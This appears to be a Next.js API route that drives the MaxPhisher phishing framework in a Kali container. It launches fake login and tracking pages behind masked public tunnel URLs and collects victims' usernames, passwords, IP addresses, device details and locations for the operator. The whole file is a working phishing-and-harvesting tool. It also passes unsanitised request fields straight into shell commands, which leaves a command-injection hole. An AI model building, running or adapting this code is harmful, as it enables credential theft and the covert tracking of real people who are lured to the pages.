// app/api/phishing/route.js
import { NextResponse } from 'next/server';
import { exec } from 'child_process';
import { promisify } from 'util';
import path from 'path';
import fs from 'fs/promises';

const execAsync = promisify(exec);
const containerName = 'kali-default'; // Your Kali container name
const maxPhisherDir = '/root/MaxPhisher'; // Path inside container
const siteDir = '/root/.site';      // Output dir inside container
const maxSitesDir = '/root/.maxsites';   // Templates dir inside container
const tunnelerDir = '/root/.tunneler'; // Log dir inside container
const resultsDir = '/root/.maxphisher/dumps'; // Where captured data is stored

// Store the running process info and status in memory
let runningProcess = null;
let processStatus = 'inactive'; // inactive, starting, ready, error
let processOutput = '';
let processError = '';
let capturedUrls = {};
let capturedData = {
  credentials: [],
  deviceInfo: [],
  locations: [],
  ips: []
};

// Helper to run commands in Docker, handling errors and logging
async function dockerExec(command, ignoreError = false) {
    const fullCommand = `docker exec ${containerName} bash -c "${command}"`;
    try {
        const { stdout, stderr } = await execAsync(fullCommand);
        // Log stderr only if it's not an ignored error and not empty
        if (stderr && !ignoreError && stderr.trim()) {
            console.warn(`Docker stderr for "${command.substring(0, 100)}...": ${stderr.trim()}`);
        }
        return { stdout, stderr };
    } catch (error) {
        console.error(`Error executing Docker command "${command.substring(0, 100)}...":`, error.message);
        if (!ignoreError) {
            throw error; // Re-throw if not ignored
        }
        // Return error message in stderr if ignored
        return { stdout: '', stderr: error.message || String(error) };
    }
}

// --- Attack type to number mapping (Case-insensitive lookup) ---
const attackTypes = {
    login: '1', image: '2', video: '3', audio: '4',
    location: '5', ip_tracker: '6', device: '7', clipboard: '8'
};

function getAttackTypeIndex(typeName) {
    return attackTypes[typeName?.toLowerCase()] || '1'; // Default to '1' (login) if not found
}

// --- Get Templates Function ---
async function getTemplates() {
    try {
        const templateFilePath = path.posix.join(maxSitesDir, 'templates.json');
        // Check if file exists first
        const { stdout: fileCheck } = await dockerExec(`[ -f ${templateFilePath} ] && echo "exists" || echo "not_found"`, true);
        
        if (fileCheck.trim() !== 'exists') {
             console.error(`Templates file not found at ${templateFilePath} in container ${containerName}`);
             return { success: false, error: 'Templates file not found in container. Try restarting the tool or updating templates.' };
        }
        
        const { stdout } = await dockerExec(`cat ${templateFilePath}`);
        const templatesData = JSON.parse(stdout);
        return { success: true, templates: templatesData };
    } catch (error) {
        console.error("Error fetching templates:", error);
        if (error instanceof SyntaxError) {
            return { success: false, error: 'Failed to parse templates file (corrupted?).' };
        }
        return { success: false, error: error.message || 'Unknown error loading templates' };
    }
}

// --- Parse MaxPhisher Output for URLs ---
function parseMaxPhisherOutput(output) {
    const urls = {};
    const cloudflaredPattern = /╭─\s+CloudFlared\s+[─]+\s+╮\s*\n\s*│\s+URL\s*:\s*(https:\/\/[^\s]+)\s*│\s*\n\s*│\s+MaskedURL\s*:\s*(https:\/\/[^\s]+)\s*│/;
    const localxposePattern = /╭─\s+LocalXpose\s+[─]+\s+╮\s*\n\s*│\s+URL\s*:\s*(https:\/\/[^\s]+)\s*│\s*\n\s*│\s+MaskedURL\s*:\s*(https:\/\/[^\s]+)\s*│/;
    const localhostrunPattern = /╭─\s+LocalHostRun\s+[─]+\s+╮\s*\n\s*│\s+URL\s*:\s*(https:\/\/[^\s]+)\s*│\s*\n\s*│\s+MaskedURL\s*:\s*(https:\/\/[^\s]+)\s*│/;
    const serveoPattern = /╭─\s+Serveo\s+[─]+\s+╮\s*\n\s*│\s+URL\s*:\s*(https:\/\/[^\s]+)\s*│\s*\n\s*│\s+MaskedURL\s*:\s*(https:\/\/[^\s]+)\s*│/;
    
    const cloudflaredMatch = output.match(cloudflaredPattern);
    if (cloudflaredMatch && cloudflaredMatch.length >= 3) {
        urls.cloudflared = {
            URL: cloudflaredMatch[1],
            MaskedURL: cloudflaredMatch[2]
        };
    }
    
    const localxposeMatch = output.match(localxposePattern);
    if (localxposeMatch && localxposeMatch.length >= 3) {
        urls.localxpose = {
            URL: localxposeMatch[1],
            MaskedURL: localxposeMatch[2]
        };
    }
    
    const localhostrunMatch = output.match(localhostrunPattern);
    if (localhostrunMatch && localhostrunMatch.length >= 3) {
        urls.localhostrun = {
            URL: localhostrunMatch[1],
            MaskedURL: localhostrunMatch[2]
        };
    }
    
    const serveoMatch = output.match(serveoPattern);
    if (serveoMatch && serveoMatch.length >= 3) {
        urls.serveo = {
            URL: serveoMatch[1],
            MaskedURL: serveoMatch[2]
        };
    }
    
    return urls;
}

// --- Parse MaxPhisher Output for IP Info ---
function parseIpInfo(output) {
    const ipPattern = /\[\*\]\s*IP\s*:\s*([^\s]+)/g;
    const ips = [];
    let match;
    
    while ((match = ipPattern.exec(output)) !== null) {
        if (match[1] && !ips.includes(match[1])) {
            ips.push(match[1]);
        }
    }
    
    return ips;
}

// --- Parse Device Info ---
function parseDeviceInfo(output) {
    const deviceInfoPattern = /\[\*\]\s*User\s*OS\s*:\s*([^\n]+)\n\s*\[\*\]\s*User\s*Agent\s*:\s*([^\n]+)/g;
    const deviceInfo = [];
    let match;
    
    while ((match = deviceInfoPattern.exec(output)) !== null) {
        if (match[1] && match[2]) {
            deviceInfo.push({
                os: match[1].trim(),
                userAgent: match[2].trim()
            });
        }
    }
    
    return deviceInfo;
}

// --- Parse Credentials ---
async function parseCredentials() {
    try {
        // Check if usernames.dat and passwords.dat exist
        const { stdout: usernamesExists } = await dockerExec(`[ -f ${resultsDir}/usernames.dat ] && echo "exists" || echo "not_found"`, true);
        const { stdout: passwordsExists } = await dockerExec(`[ -f ${resultsDir}/passwords.dat ] && echo "exists" || echo "not_found"`, true);
        
        if (usernamesExists.trim() !== 'exists' || passwordsExists.trim() !== 'exists') {
            return [];
        }
        
        // Read and parse credentials
        const { stdout: usernames } = await dockerExec(`cat ${resultsDir}/usernames.dat`, true);
        const { stdout: passwords } = await dockerExec(`cat ${resultsDir}/passwords.dat`, true);
        
        const usernameLines = usernames.trim().split('\n');
        const passwordLines = passwords.trim().split('\n');
        
        const credentials = [];
        
        for (let i = 0; i < Math.min(usernameLines.length, passwordLines.length); i++) {
            if (usernameLines[i] && passwordLines[i]) {
                credentials.push({
                    username: usernameLines[i].trim(),
                    password: passwordLines[i].trim(),
                    timestamp: new Date().toISOString()
                });
            }
        }
        
        return credentials;
    } catch (error) {
        console.error("Error parsing credentials:", error);
        return [];
    }
}

// --- Parse Location Data ---
async function parseLocationData() {
    try {
        const { stdout: locationExists } = await dockerExec(`[ -f ${resultsDir}/location.dat ] && echo "exists" || echo "not_found"`, true);
        
        if (locationExists.trim() !== 'exists') {
            return [];
        }
        
        const { stdout: locationData } = await dockerExec(`cat ${resultsDir}/location.dat`, true);
        const locations = [];
        
        // Parse location data - format may vary depending on MaxPhisher implementation
        if (locationData.trim()) {
            const entries = locationData.trim().split('\n\n');
            
            for (const entry of entries) {
                try {
                    // Try to parse as JSON
                    const locationObj = JSON.parse(entry);
                    locations.push(locationObj);
                } catch (e) {
                    // If not JSON, try to extract coordinates from raw text
                    const latMatch = entry.match(/latitude:\s*([\d.-]+)/i);
                    const longMatch = entry.match(/longitude:\s*([\d.-]+)/i);
                    
                    if (latMatch && longMatch) {
                        locations.push({
                            latitude: parseFloat(latMatch[1]),
                            longitude: parseFloat(longMatch[1]),
                            raw: entry.trim()
                        });
                    }
                }
            }
        }
        
        return locations;
    } catch (error) {
        console.error("Error parsing location data:", error);
        return [];
    }
}

// --- Start Attack Function ---
async function startAttack(options) {
    // Kill any existing processes
    if (runningProcess) {
        try {
            process.kill(runningProcess.pid);
        } catch (error) {
            console.warn("Error killing previous process:", error);
        }
    }
    
    // Reset state
    processStatus = 'starting';
    processOutput = '';
    processError = '';
    capturedUrls = {};
    capturedData = {
        credentials: [],
        deviceInfo: [],
        locations: [],
        ips: []
    };

    // Build command
    const typeIndex = getAttackTypeIndex(options.attackType);
    const templateIndex = options.template || '1';
    const port = options.port || '8080';
    const tunneler = options.tunneler || 'cloudflared';
    
    let command = `cd ${maxPhisherDir} && python3 maxphisher.py -t ${typeIndex} -o ${templateIndex} --tunneler ${tunneler} -p ${port} --noupdate`;
    
    // Add additional options based on attack type
    if (options.attackType === 'image' && options.template === '1' && options.festival) {
        command += ` --festival "${options.festival}"`;
    }
    
    if (((options.attackType === 'image' && options.template === '2') || options.attackType === 'video') && options.ytId) {
        command += ` --yt-id "${options.ytId}"`;
    }
    
    if ((options.attackType === 'video' || options.attackType === 'audio') && options.duration) {
        command += ` --duration ${options.duration}`;
    }
    
    if (options.tunneler === 'loclx') {
        if (options.region) command += ` --region ${options.region}`;
        if (options.subdomain) command += ` --subdomain ${options.subdomain}`;
    }
    
    if (options.redirectUrl) {
        command += ` --redirect ${options.redirectUrl}`;
    }
    
    try {
        // Clean previous MaxPhisher data
        await dockerExec(`rm -rf ${siteDir}/* ${tunnelerDir}/* ${resultsDir}/* || true`, true);
        
        // Run the command in the container (non-blocking)
        const child = exec(`docker exec ${containerName} bash -c "${command}"`);
        runningProcess = child;
        
        // Collect output
        child.stdout.on('data', (data) => {
            processOutput += data;
            
            // Check for URLs in output
            const foundUrls = parseMaxPhisherOutput(processOutput);
            if (Object.keys(foundUrls).length > 0) {
                capturedUrls = foundUrls;
                processStatus = 'ready';
            }
            
            // Check for IPs
            const foundIps = parseIpInfo(data);
            if (foundIps.length > 0) {
                capturedData.ips = [...new Set([...capturedData.ips, ...foundIps])];
            }
            
            // Check for device info
            const foundDeviceInfo = parseDeviceInfo(data);
            if (foundDeviceInfo.length > 0) {
                capturedData.deviceInfo = [...capturedData.deviceInfo, ...foundDeviceInfo];
            }
        });
        
        child.stderr.on('data', (data) => {
            processError += data;
            console.error(`MaxPhisher stderr: ${data}`);
        });
        
        child.on('close', (code) => {
            console.log(`MaxPhisher process exited with code ${code}`);
            if (code !== 0 && processStatus !== 'ready') {
                processStatus = 'error';
            }
            runningProcess = null;
        });
        
        // Wait briefly for process to start and URLs to generate
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        // Check if URLs were captured
        if (Object.keys(capturedUrls).length > 0) {
            return { 
                success: true, 
                urls: capturedUrls,
                status: processStatus,
                isRunning: !!runningProcess
            };
        } else {
            // Return partial success - started but no URLs yet
            return { 
                success: true, 
                status: processStatus,
                message: "Attack started, waiting for URLs...",
                isRunning: !!runningProcess
            };
        }
    } catch (error) {
        processStatus = 'error';
        return { 
            success: false, 
            error: error.message || "Failed to start attack",
            logs: processOutput + "\n\n" + processError,
            isRunning: false
        };
    }
}

// --- Stop Attack Function ---
async function stopAttack() {
    try {
        // Kill our running process if it exists
        if (runningProcess) {
            process.kill(runningProcess.pid);
            runningProcess = null;
        }
        
        // Also try to clean up any MaxPhisher processes in the container
        await dockerExec(`pkill -f "python3 maxphisher.py" || true`, true);
        await dockerExec(`pkill -f "php -S" || true`, true);
        await dockerExec(`pkill -f "cloudflared tunnel" || true`, true);
        await dockerExec(`pkill -f "loclx tunnel" || true`, true);
        await dockerExec(`pkill -f "ssh -R" || true`, true);
        
        processStatus = 'inactive';
        
        return { 
            success: true, 
            message: "Attack stopped successfully" 
        };
    } catch (error) {
        console.error("Error stopping attack:", error);
        return { 
            success: false, 
            error: error.message || "Failed to stop attack" 
        };
    }
}

// --- Get Captures Function ---
async function getCaptures() {
    try {
        // Parse credentials if attack is active
        if (runningProcess || processStatus === 'ready') {
            const credentials = await parseCredentials();
            if (credentials.length > 0) {
                capturedData.credentials = credentials;
            }
            
            const locations = await parseLocationData();
            if (locations.length > 0) {
                capturedData.locations = locations;
            }
        }
        
        return { 
            success: true, 
            urls: capturedUrls,
            captures: capturedData,
            status: processStatus,
            isRunning: !!runningProcess
        };
    } catch (error) {
        console.error("Error getting captures:", error);
        return { 
            success: false, 
            error: error.message || "Failed to get captures",
            isRunning: !!runningProcess
        };
    }
}

// --- Main API Handler ---
export async function POST(request) {
    try {
        const data = await request.json();
        
        // Validate container exists before doing anything
        try {
            const { stdout: containerCheck } = await execAsync(`docker ps --filter "name=${containerName}" --format "{{.Names}}"`);
            if (!containerCheck.includes(containerName)) {
                return NextResponse.json({ 
                    success: false, 
                    error: `Kali container '${containerName}' is not running` 
                }, { status: 500 });
            }
        } catch (error) {
            return NextResponse.json({ 
                success: false, 
                error: "Failed to check Docker container status" 
            }, { status: 500 });
        }
        
        // Handle different action types
        switch (data.action) {
            case 'get_templates':
                const templatesResult = await getTemplates();
                return NextResponse.json(templatesResult);
                
            case 'start':
                if (!data.options) {
                    return NextResponse.json({ 
                        success: false, 
                        error: "Missing options for attack" 
                    }, { status: 400 });
                }
                const startResult = await startAttack(data.options);
                return NextResponse.json(startResult);
                
            case 'stop':
                const stopResult = await stopAttack();
                return NextResponse.json(stopResult);
                
            case 'captures':
                const capturesResult = await getCaptures();
                return NextResponse.json(capturesResult);
                
            default:
                return NextResponse.json({ 
                    success: false, 
                    error: "Invalid action type" 
                }, { status: 400 });
        }
    } catch (error) {
        console.error("API error:", error);
        return NextResponse.json({ 
            success: false, 
            error: error.message || "Unknown API error" 
        }, { status: 500 });
    }
}